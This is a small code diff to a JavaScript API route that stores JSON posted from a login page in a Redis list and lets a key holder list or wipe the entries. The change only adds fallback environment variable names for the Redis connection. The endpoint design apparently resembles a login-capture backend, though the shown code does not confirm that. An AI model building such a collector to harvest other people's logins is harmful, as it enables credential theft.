@@ -2,7 +2,6 @@
 // POST   /api/logs                    -> capture (JSON body from login page)
 // GET    /api/logs?k=…&page=&limit=    -> JSON { entries, total, page, limit }
 // DELETE /api/logs?k=…                 -> wipes the Redis list
-// Env: UPSTASH_REDIS_REST_URL, UPSTASH_REDIS_REST_TOKEN, VIEW_KEY
 
 import { Redis } from '@upstash/redis';
 
@@ -14,8 +13,10 @@ const DEFAULT_LIMIT = 25;
 const MAX_LIMIT = 100;
 
 function redis() {
-  const url = process.env.UPSTASH_REDIS_REST_URL;
-  const token = process.env.UPSTASH_REDIS_REST_TOKEN;
+  // Check UPSTASH_ first, fallback to KV_ (Vercel integration names)
+  const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
+  const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
+  
   if (!url || !token) return null;
   return new Redis({ url, token });
 }
